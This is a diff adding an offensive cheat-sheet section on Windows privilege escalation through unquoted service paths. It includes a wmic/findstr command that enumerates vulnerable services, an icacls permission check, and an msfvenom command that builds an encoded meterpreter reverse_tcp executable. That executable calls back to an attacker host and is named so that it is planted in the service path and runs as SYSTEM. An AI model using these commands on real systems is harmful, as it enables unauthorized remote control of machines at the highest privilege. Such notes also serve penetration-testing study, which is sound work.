@@ -1,0 +1,25 @@
+### Unquoted Service Path
+```
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+```
+If you look at the registry entry for this service with Regedit you can see the ImagePath value is:
+
+C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
+When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find:
+```
+C:\Program.exe
+C:\Program Files.exe
+C:\Program Files (x86)\Program.exe
+C:\Program Files (x86)\Program Folder\A.exe
+C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
+```
+If we can drop our malicious exe successfully on one of these paths, upon a restart of the service, Windows will run our exe as SYSTEM.
+
+In order to check the permissions of a folder
+icacls "C:\Program Files (x86)\Program Folder"
+
+
+
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o A.exe
+Let’s place our payload to C:\Program Files (x86)\Program Folder folder:
+cd "../../../Program Files (x86)/Program Folder"
